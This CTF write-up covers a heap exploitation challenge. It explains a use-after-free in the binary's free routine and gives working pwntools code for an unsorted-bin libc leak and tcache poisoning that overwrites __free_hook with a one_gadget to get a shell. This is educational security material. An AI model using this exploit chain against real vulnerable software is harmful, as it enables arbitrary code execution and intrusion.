# Babyheap
We are given a classic heap exploitation binary, where we have the ability to malloc, free and show chunks in the memory.
The binary is has a ```while true``` that runs these options:
```
1. Allocate some memory
2. Show data at memory location
3. Free some memory
4. Exit
```

1. Allocating data lets us choose the size, contents and index of the chunk. There can be at most 8 chunks.
chunk addresses are stored in an array named ```heap_buf``` in the ```bss``` segment.
2. Printing data, lets us choose an index from the ```heap_buf``` array and prints its' contents.
3. Free, lets us free a chunk from the ```heap_buf``` array.
4. Exits.

## The vulnerabilities:
1. Let's take a look at the ```freeing``` function:
```c
void freeing(void)
{
  int iVar1;
  long in_FS_OFFSET;
  undefined local_15;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("What index would you like to free?");
  iVar1 = __isoc99_scanf(&DAT_00102031,&local_14);
  if (iVar1 == 0) {
    puts("Please enter an integer.");
    __isoc99_scanf(&DAT_0010204d,&local_15);
  }
  else {
    if (local_14 < 8) {
      free(*(void **)(heap_buf + (long)local_14 * 8));
    }
    else {
      puts("Can\'t reach that index!");
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
Well this function indeed frees a chunk but doesn't set the ```heap_buf``` at that index to ```0```, giving us use after free.

2. The libc version of the challenge is 2.27 so we have some freedom doing common heap exploits since this isn't libc >= 2.29
In particular, we will use unsorted bin libc leak and tcahce dup and tcache poisoning for our advantage.
## Our convenience functions:
```python
def alloc(index, size, content):
    p.sendlineafter("Exit", "1")
    p.sendlineafter("?", str(size))
    p.sendlineafter("?", str(index))
    p.sendlineafter("?",  content)

def free(index):
    p.sendlineafter("Exit", "3")
    p.sendlineafter("?", str(index))

def show(index):
    p.sendlineafter("Exit", "2")
    p.sendlineafter("?", str(index))
```

## Leaking libc
First of all, I want to leak libc base address and it is possible to do that by using unsorted bin vulnerability.
Unsorted bin, is a circular list, with both ends pointing into ```main_arena``` which are fixed variables in libc.
So, if we can leak one of the ends of this circular list we can determine libc base.

```python
alloc(0, 0x2000, 8*b"A")
alloc(1, 0x2000, 8*b"B")
free(0)
show(0)
```
We alloc two large chunks, when we free the first one it'll end up of the unsorted bin.
If I had allocated only one large chunk, upon free, it'll consolidate with the ```top``` chunk, therefore we must allocate two chunks.
Now because we have a use after free, when we so the contents of the first chunk we actually leak the ```fd``` pointer of the chunk in the unsorted bin.
This gives us a known address with a fixed offset of ```0x3ebca0``` to libc base.

## Quick overview of tcache dup & poisoning
Freed small chunks are stored in the ```tcache```, and upon ```maloc```ing chunks of some size, ```malloc``` will first lookup in the ```tcache```
Chunks in the tcache are structs that look like: 
```c
strcut chunk {
	INTERNAL_SIZE_T mchunk_prev_size;
	INTERNAL_SIZE_T mchunk_size;
	struct malloc_chunk* fd; //Pointer to the next chunk in the tcache.
	struct malloc_chunk* bk; //Pointer to the previous chunk in the tcahce.
```
Where the pointer to the chunk actually point to the ```fd``` member.
Now, imagine:
```c
malloc(0x10) // chunk #1
free(chunk1) 
free(chunk1)
```
The tcache will have the two same chunks, were the first chunk ```fd``` member points to itself.
Now,
```c
malloc(0x10) // we get the same chunk1, the first in the tcache
write(chunk1, address) // write some address to the newly malloc'd chunk.
malloc(0x10) // we get the same chunk2, the second in the tcache.
malloc(0x10) // we get a chunk that points to address!
```
The point is, that writing to chunk, actually override the ```fd``` member, and upon next allocation, ```malloc``` will be tricked and allocate the chunk pointed by the ```fd``` pointer of ```chunk1```

So,
```python
alloc(2, 0x10, 8*b"A")
alloc(3, 0x10, 8*b"B")
free(2)
free(2)

alloc(5, 0x10, p64(libc.sym["__free_hook"]))
alloc(6, 0x10, 8*b"C")
alloc(7, 0x10, p64(libc.address + 0x4f3c2))
```
allocating chunk 5 and writing ```__free_hook``` to it, will poison the tcache.
allocating chunk 6 will give us the 2nd ```free(2)``` entry from the tcache
Chunk 7 will point to ```__free_hook```, and we write the address of a ```one_gadget``` there.

Now simply ```free(0)``` and we get shell.

